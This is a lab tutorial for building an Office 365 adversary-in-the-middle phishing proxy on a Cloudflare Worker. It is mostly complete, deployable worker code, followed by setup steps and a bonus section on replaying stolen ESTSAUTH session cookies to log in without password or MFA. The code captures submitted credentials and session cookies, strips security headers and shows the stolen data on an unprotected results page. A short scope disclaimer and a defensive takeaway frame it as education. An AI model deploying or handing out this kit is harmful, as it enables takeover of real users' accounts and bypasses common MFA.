# Lab 3 — Office 365 Phishing with a Cloudflare Worker (Adversary-in-the-Middle)

## About this lab

Modern phishing campaigns no longer rely on convincing replicas of login pages. Instead, attackers place a transparent reverse proxy between the victim and the real identity provider. The victim completes a genuine Microsoft login — entering their real password and satisfying MFA — while the proxy silently harvests their password and the session cookies that are issued after authentication succeeds.

This lab demonstrates that technique using a Cloudflare Worker that proxies `login.microsoftonline.com`. When a victim logs in through your worker URL, two things are captured and stored:

- **Credentials** — the username and password submitted in the POST request
- **Session cookies** — the `ESTSAUTH` and `ESTSAUTHPERSISTENT` cookies that Microsoft issues after a successful login (including after MFA)

Results are stored privately in **Cloudflare Workers KV** and are only accessible via a secret token that you generate yourself. Data expires automatically after 10 minutes.

The session cookies are the more powerful artefact: they can be replayed in another browser to authenticate as the victim **without knowing the password and without re-triggering MFA**.

> 💡 **Scope** — This lab is for authorised testing and security education only. Only use a test account you own.

---

## Requirements

| Requirement | Notes |
|---|---|
| Cloudflare account (free tier) | [dash.cloudflare.com](https://dash.cloudflare.com) — no credit card required |
| Microsoft 365 test account | A disposable account you control — see note below |
| Cookie-Editor browser extension | [cookie-editor.com](https://cookie-editor.com/) — Chrome or Edge. In InPrivate/Incognito, extension access is off by default: open the extension details and enable **Allow in InPrivate** (Edge) or **Allow in Incognito** (Chrome). |

<details>
<summary><strong>About the test account</strong></summary>

**Account type — hybrid or cloud-only**

The worker proxies `login.microsoftonline.com`, so any account that authenticates through Microsoft Entra ID (formerly Azure AD) will work. That includes:

- **Cloud-only** accounts (identities that exist only in Entra ID)
- **Hybrid** accounts (on-premises AD identities synced to Entra ID via Entra Connect)

**ADFS is not supported.** If your organisation federates authentication to an on-premises ADFS farm, the login flow will redirect away from `login.microsoftonline.com` to your ADFS endpoint — outside the worker's reach. The proxy will not capture credentials or cookies in that case. Use a cloud-only or hybrid (password hash sync / pass-through authentication) account instead.

---

**MFA — enforce it for the best demonstration**

The real point of this lab is to show that session cookies are captured *after* MFA completes. To make that visible, configure your test account with a non-phishing-resistant MFA method:

| MFA method | Works for this lab |
|---|---|
| Microsoft Authenticator — push notification | ✓ |
| Microsoft Authenticator — TOTP code | ✓ |
| TOTP app (e.g. Google Authenticator) | ✓ |
| SMS one-time code | ✓ |
| Hardware OATH token | ✓ |
| Passwordless phone sign-in | ✓ |
| FIDO2 security key / passkey | ✗ phishing-resistant — blocks the attack |
| Certificate-based authentication | ✗ phishing-resistant — blocks the attack |

With any of the ✓ methods, the victim will complete MFA successfully on the proxy, and the resulting session cookies are still captured. This is the core lesson: **MFA alone does not stop an adversary-in-the-middle phish** unless the method is phishing-resistant.

</details>

---

## Steps

### 1 — Create a Cloudflare Worker

1. Log in to [dash.cloudflare.com](https://dash.cloudflare.com).
2. In the left sidebar click **Workers & Pages** → **Create application**.
3. Choose **Start with Hello World!**
4. Leave the generated name as-is → **Deploy**.
5. On the next screen click **Edit code** (top right).
6. Select all the default code in the editor and delete it.
7. Copy the code below, paste it into the editor, and click **Deploy**.

<details>
<summary>worker.js — click to expand</summary>

```js
// No configuration needed — paste this file as-is.
// Visit /cookie on your worker URL to view captured data.

// Microsoft
const upstream = 'login.microsoftonline.com'
const upstream_path = '/'
const https = true

// Blocking
const blocked_region = []
const blocked_ip_address = ['0.0.0.0', '127.0.0.1']

addEventListener('fetch', event => {
    event.respondWith(fetchAndApply(event.request));
})

async function fetchAndApply(request) {
    const url = new URL(request.url);

    if (url.pathname === '/results') {
        return handleResults();
    }

    if (url.pathname === '/cookie') {
        return Response.redirect(`${url.origin}/results`, 302);
    }

    const region = request.headers.get('cf-ipcountry').toUpperCase();
    const ip_address = request.headers.get('cf-connecting-ip');

    let all_cookies = ""
    let response = null;
    let url_hostname = url.hostname;

    if (https == true) {
        url.protocol = 'https:';
    } else {
        url.protocol = 'http:';
    }

    var upstream_domain = upstream;
    url.host = upstream_domain;

    if (url.pathname == '/') {
        url.pathname = upstream_path;
    } else {
        url.pathname = upstream_path + url.pathname;
    }

    if (blocked_region.includes(region)) {
        response = new Response('Access denied.', {
            status: 403
        });
    } else if (blocked_ip_address.includes(ip_address)) {
        response = new Response('Access denied', {
            status: 403
        });
    } else {
        let method = request.method;
        let request_headers = request.headers;
        let new_request_headers = new Headers(request_headers);

        new_request_headers.set('Host', upstream_domain);
        new_request_headers.set('Referer', url.protocol + '//' + url_hostname);

        if (request.method === 'POST') {
            const temp_req = await request.clone();
            var body = await temp_req.text()
            const keyValuePairs = body.split('&');
            let captured = { username: null, password: null };

            for (const pair of keyValuePairs) {
                const [key, value] = pair.split('=');
                if (key === 'login') {
                    captured.username = decodeURIComponent(value.replace(/\+/g, ' '));
                }
                if (key === 'passwd') {
                    captured.password = decodeURIComponent(value.replace(/\+/g, ' '));
                }
            }
            if (captured.username && captured.password) {
                await PHISH_STORE.put('credentials', JSON.stringify(captured), { expirationTtl: 600 });
            }
        }

        let original_response = await fetch(url.href, {
            method: method,
            headers: new_request_headers,
            body: request.body
        })

        connection_upgrade = new_request_headers.get("Upgrade");
        if (connection_upgrade && connection_upgrade.toLowerCase() == "websocket") {
            return original_response;
        }

        let original_response_clone = original_response.clone();
        let original_text = null;
        let response_headers = original_response.headers;
        let new_response_headers = new Headers(response_headers);
        let status = original_response.status;

        new_response_headers.set('access-control-allow-origin', '*');
        new_response_headers.set('access-control-allow-credentials', true);
        new_response_headers.delete('content-security-policy');
        new_response_headers.delete('content-security-policy-report-only');
        new_response_headers.delete('clear-site-data');

        try {
            const originalCookies = new_response_headers.getAll("Set-Cookie");
            const targetCookies = ['ESTSAUTH', 'ESTSAUTHPERSISTENT'];
            const captured = [];

            originalCookies.forEach(originalCookie => {
                const modifiedCookie = originalCookie.replace(/login\.microsoftonline\.com/g, url_hostname);
                new_response_headers.append("Set-Cookie", modifiedCookie);
                if (targetCookies.some(name => originalCookie.startsWith(name + '='))) {
                    captured.push(parseSetCookie(originalCookie));
                }
            });
            if (captured.length > 0) {
                all_cookies = JSON.stringify(captured, null, 2);
            }
        } catch (error) {
            console.error(error);
        }

        original_text = await replace_response_text(original_response_clone, upstream_domain, url_hostname);

        if (all_cookies) {
            await PHISH_STORE.put('cookies', all_cookies, { expirationTtl: 600 });
        }

        response = new Response(original_text, {
            status,
            headers: new_response_headers
        })
    }
    return response;
}

async function handleResults() {
    const credentials = await PHISH_STORE.get('credentials');
    const cookies = await PHISH_STORE.get('cookies');
    const creds = credentials ? JSON.parse(credentials) : null;
    const cookieList = cookies ? JSON.parse(cookies) : [];

    const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Results</title>
  <style>
    body { font-family: monospace; background: #1a1a1a; color: #e0e0e0; padding: 2rem; max-width: 900px; margin: 0 auto; }
    h2 { color: #ff4444; }
    h3 { color: #aaa; border-bottom: 1px solid #333; padding-bottom: 0.3rem; }
    .box { background: #2a2a2a; border: 1px solid #444; border-radius: 6px; padding: 1rem; margin: 1rem 0; white-space: pre-wrap; word-break: break-all; }
    .empty { color: #666; font-style: italic; }
    .label { color: #ff9900; font-weight: bold; }
    .note { color: #888; font-size: 0.9rem; }
  </style>
</head>
<body>
  <h2>Captured Results</h2>
  <p class="note">Results expire 10 minutes after capture. Refresh to check for new data.</p>

  <h3>Credentials</h3>
  ${creds
    ? `<div class="box"><span class="label">Username: </span>${creds.username}\n<span class="label">Password: </span>${creds.password}</div>`
    : `<div class="box empty">No credentials captured yet.</div>`}

  <h3>Session Cookies — Cookie-Editor JSON</h3>
  <p class="note">Open Cookie-Editor → Import → paste the JSON below.</p>
  ${cookies
    ? `<div class="box">${cookies}</div>`
    : `<div class="box empty">No cookies captured yet.</div>`}

  <h3>Session Cookies — Individual values</h3>
  <p class="note">For manual import via DevTools — copy each value separately.</p>
  ${cookieList.length > 0
    ? cookieList.map(c => `<div class="box"><span class="label">${c.name}</span><br>${c.value}</div>`).join('')
    : `<div class="box empty">No cookies captured yet.</div>`}
</body>
</html>`;

    return new Response(html, {
        status: 200,
        headers: { 'Content-Type': 'text/html; charset=utf-8' }
    });
}

function parseSetCookie(header) {
    const parts = header.split(';').map(p => p.trim());
    const eqIdx = parts[0].indexOf('=');
    const name = parts[0].substring(0, eqIdx).trim();
    const value = parts[0].substring(eqIdx + 1);
    const cookie = { name, value, domain: 'login.microsoftonline.com', path: '/', secure: false, httpOnly: false, sameSite: 'Lax' };
    for (let i = 1; i < parts.length; i++) {
        const lower = parts[i].toLowerCase();
        if (lower === 'secure') { cookie.secure = true; }
        else if (lower === 'httponly') { cookie.httpOnly = true; }
        else if (lower.startsWith('path=')) { cookie.path = parts[i].slice(5); }
        else if (lower.startsWith('domain=')) { cookie.domain = parts[i].slice(7).replace(/^\./, ''); }
        else if (lower.startsWith('samesite=')) {
            const v = parts[i].slice(9).toLowerCase();
            cookie.sameSite = v === 'none' ? 'no_restriction' : v === 'strict' ? 'strict' : 'lax';
        }
        else if (lower.startsWith('expires=')) {
            const d = new Date(parts[i].slice(8));
            if (!isNaN(d)) cookie.expirationDate = Math.floor(d.getTime() / 1000);
        }
    }
    return cookie;
}

async function replace_response_text(response, upstream_domain, host_name) {
    let text = await response.text()
    let re = new RegExp(upstream_domain, 'g')
    text = text.replace(re, host_name);
    return text;
}
```

</details>

Your worker is now live at a URL like:
```
https://<your-worker-name>.<your-subdomain>.workers.dev
```

---

### 2 — Create a KV namespace and bind it to the worker

The worker stores captured data in Cloudflare Workers KV. You need to create a storage namespace and connect it.

**Create the namespace:**

1. In the Cloudflare dashboard, go to **Storage & Databases** → **KV** (in the left sidebar).
2. Click **Create instance**.
3. Name it `PHISH_STORE` → **Create**.

**Bind it to your worker:**

1. Go back to **Workers & Pages** → click your worker.
2. Click **Settings** → **Bindings** → **Add** → **KV Namespace**.
3. Set the **Variable name** to `PHISH_STORE` (must match exactly).
4. Select the `PHISH_STORE` namespace you just created → **Deploy**.

> 💡 The variable name `PHISH_STORE` is what the worker code references — do not change it.

---

### 3 — Test the phish

1. Open a **private / incognito** browser window.
2. Navigate to your worker URL:
   ```
   https://<your-worker-name>.<your-subdomain>.workers.dev
   ```
3. You will see the real Microsoft login page, served transparently through the worker.
4. Log in with your test Microsoft 365 account (complete MFA if enabled).

> 💡 **Note** — After a successful login the Microsoft login page is shown again. This is normal and expected — it is the proxy completing its cycle. Your credentials and cookies have already been captured at this point.

---

### 4 — View your results

In a normal browser window, navigate to:

```
https://<your-worker-name>.<your-subdomain>.workers.dev/cookie
```

This will automatically redirect you to your results page. You will see the captured username, password, and session cookies formatted for Cookie-Editor. Results disappear automatically after 10 minutes.

> 💡 **Alternative** — The raw captured data can also be viewed directly in the Cloudflare dashboard under **Storage & Databases** → **Workers KV** → **PHISH_STORE** → **KV Pairs**.

> 💡 **Privacy** — The results page has no access control. It is only as private as your worker URL is obscure. After the lab, delete the worker and the KV namespace from the Cloudflare dashboard, and dispose of or clean up the Microsoft 365 test account.

---

## Bonus — Replay the captured session cookies using Cookie-Editor

The captured session cookies let you authenticate as the victim in a completely separate browser session — no password, no MFA prompt.

### Why this works

`ESTSAUTH` and `ESTSAUTHPERSISTENT` are the Microsoft Entra authentication session cookies issued by `login.microsoftonline.com` after a successful authentication. Planting them in a new browser tricks Entra into thinking an authenticated session already exists for that browser.

### Steps

1. Install the **Cookie-Editor** extension in Chrome or Edge: [cookie-editor.com](https://cookie-editor.com/)

    > 💡 **Important** — Cookie-Editor is not visible in InPrivate/Incognito by default. Enable it first in the extension details: **Allow in InPrivate** (Edge) or **Allow in Incognito** (Chrome).

2. Open a **new private window** (a session with no existing Microsoft cookies).

3. Navigate to:
   ```
   https://login.microsoftonline.com
   ```

4. Click the **Cookie-Editor** extension icon in the toolbar → click **Import** → paste the JSON from your results page.

5. Click the **Cookie-Editor** icon again and verify that `ESTSAUTH` and `ESTSAUTHPERSISTENT` are listed.

6. Refresh the browser — Microsoft will pick up the planted cookies and authenticate you without asking for credentials.

> 💡 **You are in.** You just authenticated as the victim — no password, no MFA — using only the session cookies captured by the proxy.

<details>
<summary>Alternative — import cookies manually using DevTools</summary>

1. Open **DevTools** (`F12`) and go to **Application** → **Storage** → **Cookies** → `https://login.microsoftonline.com`.
2. Double-click the empty row at the bottom of the cookie table to create a new entry and fill in:

   | Field | Value |
   |---|---|
   | Name | `ESTSAUTH` |
   | Value | *(paste the value from the JSON on the results page)* |
   | Domain | `login.microsoftonline.com` |
   | Path | `/` |
   | Secure | ✓ checked |

   Repeat for `ESTSAUTHPERSISTENT`.

3. Refresh the browser.

</details>

### What you're looking at

This technique is known as **pass-the-cookie** or **session hijacking post-MFA**. It defeats:
- Passwords
- TOTP / authenticator app MFA
- SMS MFA
- Push notifications
- Passwordless phone sign-in

It does **not** defeat:
- Phishing-resistant MFA (FIDO2 / passkeys / certificate-based auth)
- Conditional Access policies that enforce compliant/managed devices (the replayed session comes from an unmanaged device)

The defensive takeaway: enforce **Conditional Access with device compliance** and adopt **phishing-resistant MFA** to eliminate the cookie-replay risk.
